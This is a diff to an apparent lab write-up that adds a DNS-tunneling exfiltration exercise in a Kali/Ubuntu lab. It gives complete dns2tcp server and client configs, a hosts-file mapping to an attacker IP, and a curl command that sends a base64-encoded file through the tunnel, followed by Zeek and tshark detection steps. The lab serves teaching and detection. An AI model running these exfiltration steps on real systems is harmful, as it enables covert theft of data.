@@ -644,11 +644,9 @@ azureuser@ubuntu-vm:~$
 
 - The prompt `azureuser@ubuntu-vm:~$` confirms that the attacker now has an **interactive shell on the victim's system**.
 
-<p>
-  <em>A screenshot is included below to provide a visual reference of this interaction:</em><br>
-  <br>
-  <img src="images/kali_reverse_shell1.png" alt="Reverse Shell Connection Established" width="400"/>
-</p>
+_A screenshot is included below to provide a visual reference of this interaction:_
+
+![Reverse Shell Connection Established](images/kali_reverse_shell1.png)
 
 
 - This output confirms a **successful compromise**. The attacker now has **remote access to the victim’s system**, with the ability to execute commands as if they were sitting at the machine. This level of access poses a **severe security risk** — allowing the attacker to explore the file system, exfiltrate data, install malware, or escalate privileges.
@@ -674,7 +672,7 @@ uname -a
 
 On the victim’s machine, once the reverse shell command is executed, the terminal appears to freeze or become unresponsive:
 
- <img src="images/reverse_shell_victim.png" alt="Victim's Unresponsive Shell" width="500"/>
+ ![Victim's Unresponsive Shell](images/reverse_shell_victim.png)
 
 There’s **no output**, no confirmation, and no indication that a remote session has been initiated. This is because the input/output streams of the shell have been **redirected to the attacker’s system**.
 
@@ -707,8 +705,8 @@ This extracts:
 - `duration`: Duration of the connection in seconds
 
 #### Interpreting the Output:
- 
-<img src="images/reverse_shell_zeek.png" alt="Zeek's Reverse Shell Output" width="600"/>
+
+ ![Zeek's Reverse Shell Output](images/reverse_shell_zeek.png)
 
 Here is a sample of the output (shown in the image above):
 
@@ -789,6 +787,439 @@ This confirms the victim initiated a **TCP connection to port 4444**, proving th
 The communication persisted over multiple packets, indicating an interactive session.
 
 ##
-### 🕳️ 4. File Extraction via DNS Tunneling using Dns2tcp
+### 🕳️ 4. File Exfiltration via DNS Tunneling using Dns2tcp
+##
+In this attack, we simulate **covert data exfiltration** from a compromised machine using **DNS tunneling**. Once a reverse shell is established on the victim system (as shown in the previous attack), the attacker gains full remote access, including the ability to read files, install software, and execute further payloads. With this level of control, the attacker can launch **stealthy exfiltration techniques**, such as the one demonstrated here.
+
+##
+### 🧭 Understanding DNS in This Attack
+
+#### DNS (Domain Name System)
+
+DNS is a foundational internet protocol that translates **domain names** (like `hi.com`) into **IP addresses**. It typically uses port **53/UDP** and is often **allowed freely through firewalls**, since it's essential for internet connectivity. 
+
+DNS is an essential part of the internet infrastructure that makes it possible for users to easily access websites without having to memorize IP addresses. 
+
+**Key components of DNS:**
+- **DNS Servers:** 
+
+  A **DNS server** is the one actually responsible for translating domain names into machine-readable IP addresses. This process allows devices to locate and communicate with each other on the internet or internal networks.
+
+  Our computers send requests to DNS servers asking:  
+  > “What’s the IP address for this domain?”
+
+  And the DNS server replies with the answer.
+
+
+- **DNS Records:** These records contain information about a domain, including its IP address, email server, and more.
+- **DNS Queries:** These are requests made by a computer to a DNS server to find the IP address for a given domain name. 
+
+_Because DNS is so trusted and rarely inspected deeply, it can be **abused to tunnel arbitrary data** between a victim and attacker._
+
+
+
+
+##
+### 🕳️ DNS Tunneling Attack
+
+DNS tunneling works by encapsulating non-DNS traffic **inside DNS queries and responses**. It essentially uses DNS as a covert communication channel. Attackers might use tools like `dns2tcp`, `iodine`, or `dnscat2`.
+
+The basic concept relies on the fact that **DNS traffic is rarely filtered or monitored as strictly as other protocols**. 
+
+**Process:**
+
+1. **Data Encoding:** Non-DNS data (like HTTP requests, file transfers, or command-and-control communications) is encoded and embedded into DNS query names or response data
+
+2. **DNS Queries:** The encoded data is sent as DNS queries to a controlled DNS server
+
+3. **Data Extraction:** The DNS server extracts the tunneled data, processes it, and can send responses back through DNS responses
+
+4. **Reassembly:** The receiving end reassembles the tunneled data from multiple DNS transactions
+
+
+This allows attackers to **remotely control a system** or **exfiltrate sensitive data** without triggering standard alerts.
+
+#### HTTP in a DNS Tunnel
+While HTTP is typically sent over port **80/TCP**. In this attack, we use **HTTP (Hypertext Transfer Protocol)** to send the contents of a file. However, instead of sending it directly over the internet (which might be blocked or monitored), we tunnel that HTTP request through a **DNS connection**.
+
+**How it works:**
+
+- The attacker **sets up an HTTP server** on their machine.
+
+  - An **HTTP server** is a program that listens for incoming HTTP requests and responds to them. Web browsers like Chrome or Firefox send requests to HTTP servers when someone visits a website.
+
+  - In this case, a very simple HTTP server is set up using **Python**.
+
+
+-  The victim uses a **local proxy port**, created by `dns2tcpc`, to send an HTTP request through the DNS tunnel.
+  
+   - When the victim connects to the attacker using `dns2tcpc`, it creates a **tunnel** between the victim and the attacker (but not directly using HTTP or TCP). Instead, it tunnels through DNS packets.
+
+   - To make that tunnel usable by regular tools like `curl` (used for transferring data with URLs), `dns2tcpc` creates a **local port on the victim’s machine**, often called a **local proxy port**.
+
+
+- This allows HTTP-based file transfers, even when direct internet access is blocked.
+
 ##
 
+### 🧰 Understanding `dns2tcpc` and `dns2tcpd`
+
+The `dns2tcp` tool allows tunneling TCP traffic (like HTTP, SSH, etc.) through DNS queries. This is often used for bypassing network restrictions or exfiltrating data covertly. It has **two main components**:
+
+#### `dns2tcpd` : The Server
+
+- `dns2tcpd` stands for **DNS to TCP Daemon**.
+
+- It runs on the **attacker’s machine (Kali VM)** and listens for DNS requests on **UDP port 53**.
+
+- It acts as the **DNS authoritative server** (a server that keeps the official information about a domain's DNS records) for a domain.
+
+- When a client sends a special DNS query to this domain, the server responds with encoded TCP responses, thus enabling data exchange over DNS.
+
+#### `dns2tcpc` : The Client
+
+- `dns2tcpc` is the **client-side tool**, run on the **victim machine (Ubuntu VM)**.
+
+- It initiates DNS queries directed to the attacker’s DNS server (`dns2tcpd`).
+
+- These queries are **crafted to encode TCP communication** (e.g., requesting an HTTP or SSH connection).
+
+
+> **Note:** In this specific DNS tunneling scenario, no actual DNS queries are made to resolve domain names. Instead, the DNS tunnel is used as a covert communication channel to send data from the victim to the attacker. This means DNS packets are crafted and transmitted with embedded payloads that carry the exfiltrated data, not traditional hostname resolution requests.
+
+##
+
+### 👁️‍🗨️ Continue Monitoring on Ubuntu VM
+
+1. Run the commands listed above on Monitoring Setup.
+2. We´ll name the file `tcpdump` is going to write on: `dns.exfil.pcap`.
+
+##
+
+### ⚔️ Performing the Attack:
+
+#### 1. On the Victim (Ubuntu) 
+
+#### a. Installing `dns2tcp`(using reverse shell access)
+
+```
+sudo apt update
+sudo apt install dns2tcp
+```
+`dns2tcp` is the tool that will create the DNS tunnel between the victim and attacker. We install it from the victim side using shell access previously obtained (e.g., from the reverse shell attack or from a phising attack).
+
+_The following screenshot shows the installation of the dns2tcp package on the victim machine:_
+
+
+
+#### b. Adding a fake domain to `/etc/hosts` 
+
+```
+sudo nano /etc/hosts
+```
+
+Then we add:
+```
+10.0.1.4 berrysafe.com
+```
+
+This tells the victim’s machine that `berrysafe.com` should point to the attacker’s IP address. Since this is a **fake domain** not registered in public DNS, we need to manually map it to the attacker’s machine. This step ensures that when the victim tries to resolve `berrysafe.com`, the DNS request reaches the Kali VM.
+
+#### c. Preparing the file to exfiltrate 
+```
+echo "TOP SECRET DATA" > topsecret.txt
+```
+
+This creates a sample file named `topsecret.txt` containing data we want to steal. This simulates the presence of confidential information on the victim's system.
+
+
+#### d. Creating a configuration file for `dns2tcpc`
+```
+sudo nano /etc/dns2tcpc.conf
+```
+We paste the following content: 
+
+```
+domain = berrysafe.com 
+key = shhhh
+```
+
+This `dns2tcpc.conf` file defines: 
+* The domain name the client will connect to (`berrysafe.com`)
+* A shared secret key (`shhhh`) for authentication and encryption of the tunnel.
+
+This file is used by the `dns2tcpc` client when initiating the tunnel.
+
+
+#### 2. On the Attacker (Kali) 
+
+#### a. Starting a simple HTTP server to receive the file
+```
+mkdir -p ~/exfil
+cd ~/exfil
+python3 -m http.server 9000
+```
+
+This creates a directory (`~/exfil`) where received data will go, and starts a basic HTTP server on port `9000`. 
+
+**`-m http.server`**:
+* The `-m` option **runs a module as a script**. 
+* In this case, it's running the built-in `http.server` module. 
+* This module spins up a basic HTTP server that serves files from the current directory.
+
+It launches a simple HTTP file server in the current directory, accessible at:
+```
+http://<10.0.1.4>:9000/
+```
+
+When the victim sends a base64-encoded GET request (the data we are exfiltrating), it will be handled by this server.
+
+_Below is a screenshot of the attacker's machine launching a simple HTTP server, which will listen for incoming exfiltrated data:_
+
+
+#### b. Configuring the DNS server
+
+Edit the configuration file:
+```
+sudo nano /etc/dns2tcpd.conf
+```
+
+We add the following:
+
+```
+domain = berrysafe.com
+key = shhhh
+resources = exfil:127.0.0.1:9000
+```
+
+This tells `dns2tcpd`:
+- To accept requests for `berrysafe.com` 
+- To use the shared key `shhhh`
+
+- That `exfil` is a resource that forwards data to the local HTTP server at `127.0.0.1:9000`.
+
+  - The IP address `127.0.0.1` is known as the **loopback address**. It always refers to the **local machine itself**, meaning any traffic sent to `127.0.0.1` is not sent out to the network but instead loops back internally to the host. This address is commonly used by programs to communicate within the same system. The hostname **"localhost"** typically resolves to the loopback address.
+
+
+Then we start the DNS tunnel server:
+```
+sudo dns2tcpd -F -f /etc/dns2tcpd.conf
+```
+
+The `-f` flag tells `dns2tcpd` which configuration file to use, while the `-F` flag runs the server in the foreground, allowing us to monitor the DNS tunneling activity live.
+
+This creates the server side of the DNS tunnel.
+
+
+_Here, the attacker starts dns2tcpd, which begins listening for DNS-based tunnel connections from the victim:_
+
+
+#### 3. Back on the Victim: Connect and Exfiltrate
+
+#### a. Establishing a tunnel from victim to attacker
+
+Now, from the victim, the attacker uses the DNS tunnel to reach that HTTP server, but not _directly_. Instead, it sets up a **local proxy port** using `dns2tcpc`:
+
+```
+dns2tcpc -z berrysafe.com -r exfil -l 9001 10.0.1.4
+```
+
+This command:
+- Uses `-z` to specify the domain (`berrysafe.com`)
+
+- `-r exfil`: Requests the resource `exfil`, which was defined by the attacker to route to port `9000`.
+
+- Opens a local proxy port (`-l 9001`) on the victim 
+
+- Connects to the attacker at IP `10.0.1.4`
+
+
+_This screenshot captures the victim establishing a DNS tunnel to the attacker's IP using dns2tcpc:_
+
+**What happens now**:
+- The victim opens a connection to `127.0.0.1:9001` (its own localhost).
+
+- This traffic is **captured by the dns2tcpc client**, encapsulated inside DNS packets, and sent to `berrysafe.com`, which resolves to Kali (because of the `/etc/hosts` trick).
+
+- On Kali, `dns2tcpd` receives these DNS requests and **forwards them to the configured service (the HTTP server on port 9000)**.
+
+  - **Port 9001** is used locally on the victim to interact with the tunnel.
+
+  - **Port 9000** is where Kali’s HTTP server is actually listening.
+
+  - When the victim sends requests to `127.0.0.1:9001`, `dns2tcpc` encapsulates the traffic over DNS and forwards it to the attacker (Kali's VM), where it's routed to the HTTP server on port `9000`. This local-to-remote port bridging is what allows covert exfiltration of data without direct HTTP communication.
+
+ 
+#### b. Sending the file contents through the tunnel
+
+```
+curl "http://127.0.0.1:9001/?$(base64 -w 0 topsecret.txt)"
+```
+
+This command sends the contents of `topsecret.txt`, encoded in base64, through the DNS tunnel using an HTTP GET request to the local proxy created by `dns2tcpc`. The HTTP request is forwarded via the DNS tunnel to the attacker’s web server on Kali.
+
+#### Breakdown of each part:
+
+#### 1\. `base64 -w 0 topsecret.txt`
+ This part **outputs the content of `topsecret.txt`** in base64 format.
+
+- **`base64`**: A command-line tool to encode binary data into ASCII text using Base64 (common for transmitting data over text protocols like HTTP).
+
+- **`-w 0`**: Disables line wrapping (i.e., output is on one long line). This is necessary because we want the base64 string to be valid in a URL.
+
+- **`topsecret.txt`**: The file we want to send.
+
+
+#### 2\. `$(...)` 
+This is **command substitution** in Bash.
+- It takes the output of the command inside and **replaces it inline**.
+
+- `$(base64 -w 0 topsecret.txt)` becomes something like: `4oCcVE9QIFNFQ1JFV...`
+
+_This is the actual **exfiltration step**, done covertly through DNS._
+
+
+#### 3\. `curl "http://127.0.0.1:9001/?...` 
+
+This part **sends the base64-encoded contents as a URL parameter** to the local proxy port `9001`, which **tunnels the HTTP request to the attacker's machine** (Kali) through DNS.
+
+- **`curl`**: A tool to make HTTP requests.
+
+- **`http://127.0.0.1:9001/`**:
+
+  - `127.0.0.1`: This is **localhost**. It refers to the same machine.
+
+  - `9001`: This is the **local port where dns2tcpc is listening** and forwarding traffic to Kali through the DNS tunnel.
+
+- **`?...`**: The `?` starts a **query string** in the URL. Whatever follows is sent as a parameter.
+
+##
+### Decoding the Captured Data
+
+ _The following screenshot shows the moment the Kali machine receives an HTTP request via the DNS tunnel:_
+
+  ![HTTP Request Kali](images/http_reques_kali.png)
+
+
+```
+127.0.0.1 - - [23/Jul/2025 20:53:10] "GET /?4oCcVE9QIFNFQ1JFVCBEQVRB4oCdCg== HTTP/1.1" 200 -
+```
+This line is a standard HTTP request log entry printed by the Python HTTP server. 
+
+- `127.0.0.1`: This is the IP address of the client making the request. `127.0.0.1` is the **loopback address**, meaning the request was made **locally** on the same machine (Kali).
+
+- `GET /?... HTTP/1.1`: This shows the type of request (`GET`) and the **path**. In this case, the request URL includes the **base64-encoded exfiltrated data**: `/?4oCcVE9QIFNFQ1JFVCBEQVRB4oCdCg==`
+
+This log entry **confirms that the exfiltrated data reached the attacker's machine**. The attacker can now extract the encoded part (`4oCcVE9QIFNFQ1JFVCBEQVRB4oCdCg==`) and decode it using the following command:
+
+```
+echo '4oCcVE9QIFNFQ1JFVCBEQVRB4oCdCg==' | base64 -d
+```
+
+_This image shows how the attacker decodes the exfiltrated file using `base64 -d`:_
+
+ ![Decoding the stolen data](images/decoding_data.png)
+
+
+
+> This step is the final piece of the DNS tunneling process. Where the attacker successfully **retrieves and decodes** the stolen data.
+
+
+
+##
+
+### DNS Tunneling Overview (Visualization)
+
+_The diagram below shows how the DNS tunnel is established and used to exfiltrate data:_
+
+ ![DNS Tunneling Diagram](images/dns_tunneling_diagram.png)
+
+The victim machine resolves a spoofed domain (`berrysafe.com`) to Kali, and the data is sent through a local proxy (`127.0.0.1:9001`) over DNS.
+
+
+##
+
+### 📊 Results and Analysis After DNS Tunneling & File Exfiltration
+
+- Once the data has been successfully exfiltrated, stop all running services:
+
+  - On **Ubuntu (Victim)**:
+
+    - Stop the `dns2tcpc` tunnel: Use `Ctrl + C` in the terminal where it was started.
+
+
+- On **Kali (Attacker)**:
+  - Stop the `dns2tcpd` daemon:
+    - Use `Ctrl + C` to safely shut down the DNS tunnel listener.
+
+    - Stop the HTTP server (used to receive the file): Also using `Ctrl + C`.
+
+
+- Stop Zeek and tcpdump using Ctrl + C.
+
+#### Analyzing DNS Tunneling Activity from the Victim's Perspective
+
+From the victim's side, detecting DNS tunneling can be challenging, as the attack leverages seemingly normal DNS traffic to exfiltrate data. In this section, we analyze the DNS packets captured during the exfiltration attempt using command-line tools. By applying specific filters, we can uncover suspicious activity, such as unusual query patterns or unexpected destinations, that indicate a covert channel is in use.
+
+#### Zeek DNS Log Analysis
+
+After running Zeek on the captured traffic, we analyzed the `dns.log` file to identify evidence of **DNS tunneling activity** during the exfiltration attack.
+
+**Command Used:**
+
+```
+cat dns.log | zeek-cut id.orig_h query | grep berrysafe.com
+```
+
+- `cat dns.log`: Displays the contents of the `dns.log` file, which contains detailed information about all DNS traffic observed by Zeek.
+
+- `zeek-cut id.orig_h query`: Filters the log to extract only the following fields:
+
+  - `id.orig_h`: The **source IP address** of the DNS request.
+  - `query`: The **DNS query name**, which could contain encoded data.
+  
+- `grep berrysafe.com`: Filters the output to show only entries involving the **attacker-controlled domain** `berrysafe.com`, which was used in the tunneling setup.
+
+This command effectively highlights all DNS queries sent to the malicious domain used to establish the tunnel and exfiltrate data.
+
+
+#### Output Analysis:
+
+_Zeek `dns.log` showing encoded DNS queries sent from the victim to berrysafe.com. These contain exfiltrated data encoded into the DNS query names._
+
+ ![Zeek DNS Log](images/zeek_dns_log.png)
+
+**Interpreting the Output**
+
+- All queries originate from `10.0.1.5`, the **victim (Ubuntu) VM**.
+
+- The domain names (e.g., `xqiaaaechd3dy...berrysafe.com`) are **heavily encoded**, suggesting **data is being hidden** inside DNS requests.
+
+- **Notably, the DNS query:** `xqiaaaaechd3dy...4oCcVE9QIFNFQ1JFVCBEQVRB4oCdCg.berrysafe.com` includes **base64-encoded chunks** of the exfiltrated data. This confirms that the DNS tunnel is being used as a **covert channel to transfer information**, not for legitimate domain resolution.
+
+
+> In this attack, no real DNS resolution was required. Instead, DNS queries acted as **data containers**, and the attacker's server simply captured the query names to reconstruct the file being exfiltrated.
+
+
+#### Tshark Traffic Analysis
+
+We used **Tshark**, the command-line version of Wireshark, to filter and extract DNS queries related to the exfiltration domain (`berrysafe.com`). This helps us identify DNS-based covert channels that wouldn't normally raise alerts in traditional traffic monitoring.
+
+#### Command Used: 
+
+```
+tshark -r dns-exfil.pcap -Y "dns.qry.name contains berrysafe.com" -T fields -e frame.time -e ip.src -e dns.qry.n
+```
+
+- `-r dns-exfil.pcap`: Read from the packet capture file containing DNS traffic.
+
+- `-Y "dns.qry.name contains berrysafe.com"`: Display only DNS queries to `berrysafe.com`, the domain used in the attack.
+
+- `-T fields`: Output selected fields rather than full packet details.
+
+- `-e frame.time`: Show the timestamp of each packet.
+
+
+#### Interpreting the Output: 
+
+The screenshot below shows several DNS queries from IP `10.0.1.5` (the **victim**) to `berrysafe.com`, including its subdomains like `auth.berrysafe.com`, `connect.berrysafe.com`, and `berrysafe.com`.
